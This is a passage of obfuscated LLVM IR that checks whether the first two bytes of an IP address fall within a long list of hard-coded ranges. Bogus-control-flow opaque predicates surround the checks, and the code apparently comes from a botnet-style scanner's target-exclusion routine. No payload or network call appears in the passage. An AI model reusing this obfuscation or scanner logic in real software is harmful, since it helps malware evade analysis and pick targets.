  %1439 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1440 = zext i8 %1439 to i32
  %1441 = icmp eq i32 %1440, 147
  %1442 = load i32, i32* @x.71
  %1443 = load i32, i32* @y.72
  %1444 = sub i32 %1442, 1
  %1445 = mul i32 %1442, %1444
  %1446 = urem i32 %1445, 2
  %1447 = icmp eq i32 %1446, 0
  %1448 = icmp slt i32 %1443, 10
  %1449 = or i1 %1447, %1448
  br i1 %1449, label %originalBBpart2199, label %originalBB197alteredBB

originalBBpart2199:                               ; preds = %originalBB197
  br i1 %1441, label %1450, label %1458

; <label>:1450:                                   ; preds = %originalBBpart2199
  %1451 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1452 = zext i8 %1451 to i32
  %1453 = icmp sge i32 %1452, 168
  br i1 %1453, label %1454, label %1458

; <label>:1454:                                   ; preds = %1450
  %1455 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1456 = zext i8 %1455 to i32
  %1457 = icmp slt i32 %1456, 170
  br i1 %1457, label %5234, label %1458

; <label>:1458:                                   ; preds = %1454, %1450, %originalBBpart2199
  %1459 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1460 = zext i8 %1459 to i32
  %1461 = icmp eq i32 %1460, 147
  br i1 %1461, label %1462, label %1486

; <label>:1462:                                   ; preds = %1458
  %1463 = load i32, i32* @x.71
  %1464 = load i32, i32* @y.72
  %1465 = sub i32 %1463, 1
  %1466 = mul i32 %1463, %1465
  %1467 = urem i32 %1466, 2
  %1468 = icmp eq i32 %1467, 0
  %1469 = icmp slt i32 %1464, 10
  %1470 = or i1 %1468, %1469
  br i1 %1470, label %originalBB201, label %originalBB201alteredBB

originalBB201:                                    ; preds = %originalBB201alteredBB, %1462
  %1471 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1472 = zext i8 %1471 to i32
  %1473 = icmp sge i32 %1472, 198
  %1474 = load i32, i32* @x.71
  %1475 = load i32, i32* @y.72
  %1476 = sub i32 %1474, 1
  %1477 = mul i32 %1474, %1476
  %1478 = urem i32 %1477, 2
  %1479 = icmp eq i32 %1478, 0
  %1480 = icmp slt i32 %1475, 10
  %1481 = or i1 %1479, %1480
  br i1 %1481, label %originalBBpart2203, label %originalBB201alteredBB

originalBBpart2203:                               ; preds = %originalBB201
  br i1 %1473, label %1482, label %1486

; <label>:1482:                                   ; preds = %originalBBpart2203
  %1483 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1484 = zext i8 %1483 to i32
  %1485 = icmp slt i32 %1484, 200
  br i1 %1485, label %5234, label %1486

; <label>:1486:                                   ; preds = %1482, %originalBBpart2203, %1458
  %1487 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1488 = zext i8 %1487 to i32
  %1489 = icmp eq i32 %1488, 147
  br i1 %1489, label %1490, label %1498

; <label>:1490:                                   ; preds = %1486
  %1491 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1492 = zext i8 %1491 to i32
  %1493 = icmp sge i32 %1492, 238
  br i1 %1493, label %1494, label %1498

; <label>:1494:                                   ; preds = %1490
  %1495 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1496 = zext i8 %1495 to i32
  %1497 = icmp slt i32 %1496, 255
  br i1 %1497, label %5234, label %1498

; <label>:1498:                                   ; preds = %1494, %1490, %1486
  %1499 = load i32, i32* @x.71
  %1500 = load i32, i32* @y.72
  %1501 = sub i32 %1499, 1
  %1502 = mul i32 %1499, %1501
  %1503 = urem i32 %1502, 2
  %1504 = icmp eq i32 %1503, 0
  %1505 = icmp slt i32 %1500, 10
  %1506 = or i1 %1504, %1505
  br i1 %1506, label %originalBB205, label %originalBB205alteredBB

originalBB205:                                    ; preds = %originalBB205alteredBB, %1498
  %1507 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1508 = zext i8 %1507 to i32
  %1509 = icmp eq i32 %1508, 150
  %1510 = load i32, i32* @x.71
  %1511 = load i32, i32* @y.72
  %1512 = sub i32 %1510, 1
  %1513 = mul i32 %1510, %1512
  %1514 = urem i32 %1513, 2
  %1515 = icmp eq i32 %1514, 0
  %1516 = icmp slt i32 %1511, 10
  %1517 = or i1 %1515, %1516
  br i1 %1517, label %originalBBpart2207, label %originalBB205alteredBB

originalBBpart2207:                               ; preds = %originalBB205
  br i1 %1509, label %1518, label %1542

; <label>:1518:                                   ; preds = %originalBBpart2207
  %1519 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1520 = zext i8 %1519 to i32
  %1521 = icmp sge i32 %1520, 113
  br i1 %1521, label %1522, label %1542

; <label>:1522:                                   ; preds = %1518
  %1523 = load i32, i32* @x.71
  %1524 = load i32, i32* @y.72
  %1525 = sub i32 %1523, 1
  %1526 = mul i32 %1523, %1525
  %1527 = urem i32 %1526, 2
  %1528 = icmp eq i32 %1527, 0
  %1529 = icmp slt i32 %1524, 10
  %1530 = or i1 %1528, %1529
  br i1 %1530, label %originalBB209, label %originalBB209alteredBB

originalBB209:                                    ; preds = %originalBB209alteredBB, %1522
  %1531 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1532 = zext i8 %1531 to i32
  %1533 = icmp slt i32 %1532, 115
  %1534 = load i32, i32* @x.71
  %1535 = load i32, i32* @y.72
  %1536 = sub i32 %1534, 1
  %1537 = mul i32 %1534, %1536
  %1538 = urem i32 %1537, 2
  %1539 = icmp eq i32 %1538, 0
  %1540 = icmp slt i32 %1535, 10
  %1541 = or i1 %1539, %1540
  br i1 %1541, label %originalBBpart2211, label %originalBB209alteredBB

originalBBpart2211:                               ; preds = %originalBB209
  br i1 %1533, label %5234, label %1542

; <label>:1542:                                   ; preds = %originalBBpart2211, %1518, %originalBBpart2207
  %1543 = load i32, i32* @x.71
  %1544 = load i32, i32* @y.72
  %1545 = sub i32 %1543, 1
  %1546 = mul i32 %1543, %1545
  %1547 = urem i32 %1546, 2
  %1548 = icmp eq i32 %1547, 0
  %1549 = icmp slt i32 %1544, 10
  %1550 = or i1 %1548, %1549
  br i1 %1550, label %originalBB213, label %originalBB213alteredBB

originalBB213:                                    ; preds = %originalBB213alteredBB, %1542
  %1551 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1552 = zext i8 %1551 to i32
  %1553 = icmp eq i32 %1552, 152
  %1554 = load i32, i32* @x.71
  %1555 = load i32, i32* @y.72
  %1556 = sub i32 %1554, 1
  %1557 = mul i32 %1554, %1556
  %1558 = urem i32 %1557, 2
  %1559 = icmp eq i32 %1558, 0
  %1560 = icmp slt i32 %1555, 10
  %1561 = or i1 %1559, %1560
  br i1 %1561, label %originalBBpart2215, label %originalBB213alteredBB

originalBBpart2215:                               ; preds = %originalBB213
  br i1 %1553, label %1562, label %1570

; <label>:1562:                                   ; preds = %originalBBpart2215
  %1563 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1564 = zext i8 %1563 to i32
  %1565 = icmp sge i32 %1564, 151
  br i1 %1565, label %1566, label %1570

; <label>:1566:                                   ; preds = %1562
  %1567 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1568 = zext i8 %1567 to i32
  %1569 = icmp slt i32 %1568, 155
  br i1 %1569, label %5234, label %1570

; <label>:1570:                                   ; preds = %1566, %1562, %originalBBpart2215
  %1571 = load i32, i32* @x.71
  %1572 = load i32, i32* @y.72
  %1573 = sub i32 %1571, 1
  %1574 = mul i32 %1571, %1573
  %1575 = urem i32 %1574, 2
  %1576 = icmp eq i32 %1575, 0
  %1577 = icmp slt i32 %1572, 10
  %1578 = or i1 %1576, %1577
  br i1 %1578, label %originalBB217, label %originalBB217alteredBB

originalBB217:                                    ; preds = %originalBB217alteredBB, %1570
  %1579 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1580 = zext i8 %1579 to i32
  %1581 = icmp eq i32 %1580, 153
  %1582 = load i32, i32* @x.71
  %1583 = load i32, i32* @y.72
  %1584 = sub i32 %1582, 1
  %1585 = mul i32 %1582, %1584
  %1586 = urem i32 %1585, 2
  %1587 = icmp eq i32 %1586, 0
  %1588 = icmp slt i32 %1583, 10
  %1589 = or i1 %1587, %1588
  br i1 %1589, label %originalBBpart2219, label %originalBB217alteredBB

originalBBpart2219:                               ; preds = %originalBB217
  br i1 %1581, label %1590, label %1614

; <label>:1590:                                   ; preds = %originalBBpart2219
  %1591 = load i32, i32* @x.71
  %1592 = load i32, i32* @y.72
  %1593 = sub i32 %1591, 1
  %1594 = mul i32 %1591, %1593
  %1595 = urem i32 %1594, 2
  %1596 = icmp eq i32 %1595, 0
  %1597 = icmp slt i32 %1592, 10
  %1598 = or i1 %1596, %1597
  br i1 %1598, label %originalBB221, label %originalBB221alteredBB

originalBB221:                                    ; preds = %originalBB221alteredBB, %1590
  %1599 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1600 = zext i8 %1599 to i32
  %1601 = icmp sge i32 %1600, 21
  %1602 = load i32, i32* @x.71
  %1603 = load i32, i32* @y.72
  %1604 = sub i32 %1602, 1
  %1605 = mul i32 %1602, %1604
  %1606 = urem i32 %1605, 2
  %1607 = icmp eq i32 %1606, 0
  %1608 = icmp slt i32 %1603, 10
  %1609 = or i1 %1607, %1608
  br i1 %1609, label %originalBBpart2223, label %originalBB221alteredBB

originalBBpart2223:                               ; preds = %originalBB221
  br i1 %1601, label %1610, label %1614

; <label>:1610:                                   ; preds = %originalBBpart2223
  %1611 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1612 = zext i8 %1611 to i32
  %1613 = icmp slt i32 %1612, 32
  br i1 %1613, label %5234, label %1614

; <label>:1614:                                   ; preds = %1610, %originalBBpart2223, %originalBBpart2219
  %1615 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1616 = zext i8 %1615 to i32
  %1617 = icmp eq i32 %1616, 155
  br i1 %1617, label %1618, label %1626

; <label>:1618:                                   ; preds = %1614
  %1619 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1620 = zext i8 %1619 to i32
  %1621 = icmp sge i32 %1620, 5
  br i1 %1621, label %1622, label %1626

; <label>:1622:                                   ; preds = %1618
  %1623 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1624 = zext i8 %1623 to i32
  %1625 = icmp slt i32 %1624, 10
  br i1 %1625, label %5234, label %1626

; <label>:1626:                                   ; preds = %1622, %1618, %1614
  %1627 = load i32, i32* @x.71
  %1628 = load i32, i32* @y.72
  %1629 = sub i32 %1627, 1
  %1630 = mul i32 %1627, %1629
  %1631 = urem i32 %1630, 2
  %1632 = icmp eq i32 %1631, 0
  %1633 = icmp slt i32 %1628, 10
  %1634 = or i1 %1632, %1633
  br i1 %1634, label %originalBB225, label %originalBB225alteredBB

originalBB225:                                    ; preds = %originalBB225alteredBB, %1626
  %1635 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1636 = zext i8 %1635 to i32
  %1637 = icmp eq i32 %1636, 155
  %1638 = load i32, i32* @x.71
  %1639 = load i32, i32* @y.72
  %1640 = sub i32 %1638, 1
  %1641 = mul i32 %1638, %1640
  %1642 = urem i32 %1641, 2
  %1643 = icmp eq i32 %1642, 0
  %1644 = icmp slt i32 %1639, 10
  %1645 = or i1 %1643, %1644
  br i1 %1645, label %originalBBpart2227, label %originalBB225alteredBB

originalBBpart2227:                               ; preds = %originalBB225
  br i1 %1637, label %1646, label %1654

; <label>:1646:                                   ; preds = %originalBBpart2227
  %1647 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1648 = zext i8 %1647 to i32
  %1649 = icmp sge i32 %1648, 74
  br i1 %1649, label %1650, label %1654

; <label>:1650:                                   ; preds = %1646
  %1651 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1652 = zext i8 %1651 to i32
  %1653 = icmp slt i32 %1652, 89
  br i1 %1653, label %5234, label %1654

; <label>:1654:                                   ; preds = %1650, %1646, %originalBBpart2227
  %1655 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1656 = zext i8 %1655 to i32
  %1657 = icmp eq i32 %1656, 155
  br i1 %1657, label %1658, label %1666

; <label>:1658:                                   ; preds = %1654
  %1659 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1660 = zext i8 %1659 to i32
  %1661 = icmp sge i32 %1660, 213
  br i1 %1661, label %1662, label %1666

; <label>:1662:                                   ; preds = %1658
  %1663 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1664 = zext i8 %1663 to i32
  %1665 = icmp slt i32 %1664, 222
  br i1 %1665, label %5234, label %1666

; <label>:1666:                                   ; preds = %1662, %1658, %1654
  %1667 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1668 = zext i8 %1667 to i32
  %1669 = icmp eq i32 %1668, 157
  br i1 %1669, label %1670, label %1694

; <label>:1670:                                   ; preds = %1666
  %1671 = load i32, i32* @x.71
  %1672 = load i32, i32* @y.72
  %1673 = sub i32 %1671, 1
  %1674 = mul i32 %1671, %1673
  %1675 = urem i32 %1674, 2
  %1676 = icmp eq i32 %1675, 0
  %1677 = icmp slt i32 %1672, 10
  %1678 = or i1 %1676, %1677
  br i1 %1678, label %originalBB229, label %originalBB229alteredBB

originalBB229:                                    ; preds = %originalBB229alteredBB, %1670
  %1679 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1680 = zext i8 %1679 to i32
  %1681 = icmp sge i32 %1680, 150
  %1682 = load i32, i32* @x.71
  %1683 = load i32, i32* @y.72
  %1684 = sub i32 %1682, 1
  %1685 = mul i32 %1682, %1684
  %1686 = urem i32 %1685, 2
  %1687 = icmp eq i32 %1686, 0
  %1688 = icmp slt i32 %1683, 10
  %1689 = or i1 %1687, %1688
  br i1 %1689, label %originalBBpart2231, label %originalBB229alteredBB

originalBBpart2231:                               ; preds = %originalBB229
  br i1 %1681, label %1690, label %1694

; <label>:1690:                                   ; preds = %originalBBpart2231
  %1691 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1692 = zext i8 %1691 to i32
  %1693 = icmp slt i32 %1692, 154
  br i1 %1693, label %5234, label %1694

; <label>:1694:                                   ; preds = %1690, %originalBBpart2231, %1666
  %1695 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1696 = zext i8 %1695 to i32
  %1697 = icmp eq i32 %1696, 158
  br i1 %1697, label %1698, label %1722

; <label>:1698:                                   ; preds = %1694
  %1699 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1700 = zext i8 %1699 to i32
  %1701 = icmp sge i32 %1700, 1
  br i1 %1701, label %1702, label %1722

; <label>:1702:                                   ; preds = %1698
  %1703 = load i32, i32* @x.71
  %1704 = load i32, i32* @y.72
  %1705 = sub i32 %1703, 1
  %1706 = mul i32 %1703, %1705
  %1707 = urem i32 %1706, 2
  %1708 = icmp eq i32 %1707, 0
  %1709 = icmp slt i32 %1704, 10
  %1710 = or i1 %1708, %1709
  br i1 %1710, label %originalBB233, label %originalBB233alteredBB

originalBB233:                                    ; preds = %originalBB233alteredBB, %1702
  %1711 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1712 = zext i8 %1711 to i32
  %1713 = icmp slt i32 %1712, 21
  %1714 = load i32, i32* @x.71
  %1715 = load i32, i32* @y.72
  %1716 = sub i32 %1714, 1
  %1717 = mul i32 %1714, %1716
  %1718 = urem i32 %1717, 2
  %1719 = icmp eq i32 %1718, 0
  %1720 = icmp slt i32 %1715, 10
  %1721 = or i1 %1719, %1720
  br i1 %1721, label %originalBBpart2235, label %originalBB233alteredBB

originalBBpart2235:                               ; preds = %originalBB233
  br i1 %1713, label %5234, label %1722

; <label>:1722:                                   ; preds = %originalBBpart2235, %1698, %1694
  %1723 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1724 = zext i8 %1723 to i32
  %1725 = icmp eq i32 %1724, 158
  br i1 %1725, label %1726, label %1734

; <label>:1726:                                   ; preds = %1722
  %1727 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1728 = zext i8 %1727 to i32
  %1729 = icmp sge i32 %1728, 235
  br i1 %1729, label %1730, label %1734

; <label>:1730:                                   ; preds = %1726
  %1731 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1732 = zext i8 %1731 to i32
  %1733 = icmp slt i32 %1732, 247
  br i1 %1733, label %5234, label %1734

; <label>:1734:                                   ; preds = %1730, %1726, %1722
  %1735 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1736 = zext i8 %1735 to i32
  %1737 = icmp eq i32 %1736, 159
  br i1 %1737, label %1738, label %1746

; <label>:1738:                                   ; preds = %1734
  %1739 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1740 = zext i8 %1739 to i32
  %1741 = icmp sge i32 %1740, 120
  br i1 %1741, label %1742, label %1746

; <label>:1742:                                   ; preds = %1738
  %1743 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1744 = zext i8 %1743 to i32
  %1745 = icmp slt i32 %1744, 121
  br i1 %1745, label %5234, label %1746

; <label>:1746:                                   ; preds = %1742, %1738, %1734
  %1747 = load i32, i32* @x.71
  %1748 = load i32, i32* @y.72
  %1749 = sub i32 %1747, 1
  %1750 = mul i32 %1747, %1749
  %1751 = urem i32 %1750, 2
  %1752 = icmp eq i32 %1751, 0
  %1753 = icmp slt i32 %1748, 10
  %1754 = or i1 %1752, %1753
  br i1 %1754, label %originalBB237, label %originalBB237alteredBB

originalBB237:                                    ; preds = %originalBB237alteredBB, %1746
  %1755 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1756 = zext i8 %1755 to i32
  %1757 = icmp eq i32 %1756, 160
  %1758 = load i32, i32* @x.71
  %1759 = load i32, i32* @y.72
  %1760 = sub i32 %1758, 1
  %1761 = mul i32 %1758, %1760
  %1762 = urem i32 %1761, 2
  %1763 = icmp eq i32 %1762, 0
  %1764 = icmp slt i32 %1759, 10
  %1765 = or i1 %1763, %1764
  br i1 %1765, label %originalBBpart2239, label %originalBB237alteredBB

originalBBpart2239:                               ; preds = %originalBB237
  br i1 %1757, label %1766, label %1774

; <label>:1766:                                   ; preds = %originalBBpart2239
  %1767 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1768 = zext i8 %1767 to i32
  %1769 = icmp sge i32 %1768, 132
  br i1 %1769, label %1770, label %1774

; <label>:1770:                                   ; preds = %1766
  %1771 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1772 = zext i8 %1771 to i32
  %1773 = icmp slt i32 %1772, 151
  br i1 %1773, label %5234, label %1774

; <label>:1774:                                   ; preds = %1770, %1766, %originalBBpart2239
  %1775 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1776 = zext i8 %1775 to i32
  %1777 = icmp eq i32 %1776, 64
  br i1 %1777, label %1778, label %1786

; <label>:1778:                                   ; preds = %1774
  %1779 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1780 = zext i8 %1779 to i32
  %1781 = icmp sge i32 %1780, 224
  br i1 %1781, label %1782, label %1786

; <label>:1782:                                   ; preds = %1778
  %1783 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1784 = zext i8 %1783 to i32
  %1785 = icmp slt i32 %1784, 227
  br i1 %1785, label %5234, label %1786

; <label>:1786:                                   ; preds = %1782, %1778, %1774
  %1787 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1788 = zext i8 %1787 to i32
  %1789 = icmp eq i32 %1788, 162
  br i1 %1789, label %1790, label %1814

; <label>:1790:                                   ; preds = %1786
  %1791 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1792 = zext i8 %1791 to i32
  %1793 = icmp sge i32 %1792, 45
  br i1 %1793, label %1794, label %1814

; <label>:1794:                                   ; preds = %1790
  %1795 = load i32, i32* @x.71
  %1796 = load i32, i32* @y.72
  %1797 = sub i32 %1795, 1
  %1798 = mul i32 %1795, %1797
  %1799 = urem i32 %1798, 2
  %1800 = icmp eq i32 %1799, 0
  %1801 = icmp slt i32 %1796, 10
  %1802 = or i1 %1800, %1801
  br i1 %1802, label %originalBB241, label %originalBB241alteredBB

originalBB241:                                    ; preds = %originalBB241alteredBB, %1794
  %1803 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1804 = zext i8 %1803 to i32
  %1805 = icmp slt i32 %1804, 47
  %1806 = load i32, i32* @x.71
  %1807 = load i32, i32* @y.72
  %1808 = sub i32 %1806, 1
  %1809 = mul i32 %1806, %1808
  %1810 = urem i32 %1809, 2
  %1811 = icmp eq i32 %1810, 0
  %1812 = icmp slt i32 %1807, 10
  %1813 = or i1 %1811, %1812
  br i1 %1813, label %originalBBpart2243, label %originalBB241alteredBB

originalBBpart2243:                               ; preds = %originalBB241
  br i1 %1805, label %5234, label %1814

; <label>:1814:                                   ; preds = %originalBBpart2243, %1790, %1786
  %1815 = load i32, i32* @x.71
  %1816 = load i32, i32* @y.72
  %1817 = sub i32 %1815, 1
  %1818 = mul i32 %1815, %1817
  %1819 = urem i32 %1818, 2
  %1820 = icmp eq i32 %1819, 0
  %1821 = icmp slt i32 %1816, 10
  %1822 = or i1 %1820, %1821
  br i1 %1822, label %originalBB245, label %originalBB245alteredBB

originalBB245:                                    ; preds = %originalBB245alteredBB, %1814
  %1823 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1824 = zext i8 %1823 to i32
  %1825 = icmp eq i32 %1824, 163
  %1826 = load i32, i32* @x.71
  %1827 = load i32, i32* @y.72
  %1828 = sub i32 %1826, 1
  %1829 = mul i32 %1826, %1828
  %1830 = urem i32 %1829, 2
  %1831 = icmp eq i32 %1830, 0
  %1832 = icmp slt i32 %1827, 10
  %1833 = or i1 %1831, %1832
  br i1 %1833, label %originalBBpart2247, label %originalBB245alteredBB

originalBBpart2247:                               ; preds = %originalBB245
  br i1 %1825, label %1834, label %1874

; <label>:1834:                                   ; preds = %originalBBpart2247
  %1835 = load i32, i32* @x.71
  %1836 = load i32, i32* @y.72
  %1837 = sub i32 %1835, 1
  %1838 = mul i32 %1835, %1837
  %1839 = urem i32 %1838, 2
  %1840 = icmp eq i32 %1839, 0
  %1841 = icmp slt i32 %1836, 10
  %1842 = or i1 %1840, %1841
  br i1 %1842, label %originalBB249, label %originalBB249alteredBB

originalBB249:                                    ; preds = %originalBB249alteredBB, %1834
  %1843 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1844 = zext i8 %1843 to i32
  %1845 = icmp sge i32 %1844, 205
  %1846 = load i32, i32* @x.71
  %1847 = load i32, i32* @y.72
  %1848 = sub i32 %1846, 1
  %1849 = mul i32 %1846, %1848
  %1850 = urem i32 %1849, 2
  %1851 = icmp eq i32 %1850, 0
  %1852 = icmp slt i32 %1847, 10
  %1853 = or i1 %1851, %1852
  br i1 %1853, label %originalBBpart2251, label %originalBB249alteredBB

originalBBpart2251:                               ; preds = %originalBB249
  br i1 %1845, label %1854, label %1874

; <label>:1854:                                   ; preds = %originalBBpart2251
  %1855 = load i32, i32* @x.71
  %1856 = load i32, i32* @y.72
  %1857 = sub i32 %1855, 1
  %1858 = mul i32 %1855, %1857
  %1859 = urem i32 %1858, 2
  %1860 = icmp eq i32 %1859, 0
  %1861 = icmp slt i32 %1856, 10
  %1862 = or i1 %1860, %1861
  br i1 %1862, label %originalBB253, label %originalBB253alteredBB

originalBB253:                                    ; preds = %originalBB253alteredBB, %1854
  %1863 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1864 = zext i8 %1863 to i32
  %1865 = icmp slt i32 %1864, 207
  %1866 = load i32, i32* @x.71
  %1867 = load i32, i32* @y.72
  %1868 = sub i32 %1866, 1
  %1869 = mul i32 %1866, %1868
  %1870 = urem i32 %1869, 2
  %1871 = icmp eq i32 %1870, 0
  %1872 = icmp slt i32 %1867, 10
  %1873 = or i1 %1871, %1872
  br i1 %1873, label %originalBBpart2255, label %originalBB253alteredBB

originalBBpart2255:                               ; preds = %originalBB253
  br i1 %1865, label %5234, label %1874

; <label>:1874:                                   ; preds = %originalBBpart2255, %originalBBpart2251, %originalBBpart2247
  %1875 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1876 = zext i8 %1875 to i32
  %1877 = icmp eq i32 %1876, 164
  br i1 %1877, label %1878, label %1886

; <label>:1878:                                   ; preds = %1874
  %1879 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1880 = zext i8 %1879 to i32
  %1881 = icmp sge i32 %1880, 45
  br i1 %1881, label %1882, label %1886

; <label>:1882:                                   ; preds = %1878
  %1883 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1884 = zext i8 %1883 to i32
  %1885 = icmp slt i32 %1884, 50
  br i1 %1885, label %5234, label %1886

; <label>:1886:                                   ; preds = %1882, %1878, %1874
  %1887 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1888 = zext i8 %1887 to i32
  %1889 = icmp eq i32 %1888, 164
  br i1 %1889, label %1890, label %1898

; <label>:1890:                                   ; preds = %1886
  %1891 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1892 = zext i8 %1891 to i32
  %1893 = icmp sge i32 %1892, 217
  br i1 %1893, label %1894, label %1898

; <label>:1894:                                   ; preds = %1890
  %1895 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1896 = zext i8 %1895 to i32
  %1897 = icmp slt i32 %1896, 233
  br i1 %1897, label %5234, label %1898

; <label>:1898:                                   ; preds = %1894, %1890, %1886
  %1899 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1900 = zext i8 %1899 to i32
  %1901 = icmp eq i32 %1900, 169
  br i1 %1901, label %1902, label %1926

; <label>:1902:                                   ; preds = %1898
  %1903 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1904 = zext i8 %1903 to i32
  %1905 = icmp sge i32 %1904, 252
  br i1 %1905, label %1906, label %1926

; <label>:1906:                                   ; preds = %1902
  %1907 = load i32, i32* @x.71
  %1908 = load i32, i32* @y.72
  %1909 = sub i32 %1907, 1
  %1910 = mul i32 %1907, %1909
  %1911 = urem i32 %1910, 2
  %1912 = icmp eq i32 %1911, 0
  %1913 = icmp slt i32 %1908, 10
  %1914 = or i1 %1912, %1913
  br i1 %1914, label %originalBB257, label %originalBB257alteredBB

originalBB257:                                    ; preds = %originalBB257alteredBB, %1906
  %1915 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1916 = zext i8 %1915 to i32
  %1917 = icmp slt i32 %1916, 254
  %1918 = load i32, i32* @x.71
  %1919 = load i32, i32* @y.72
  %1920 = sub i32 %1918, 1
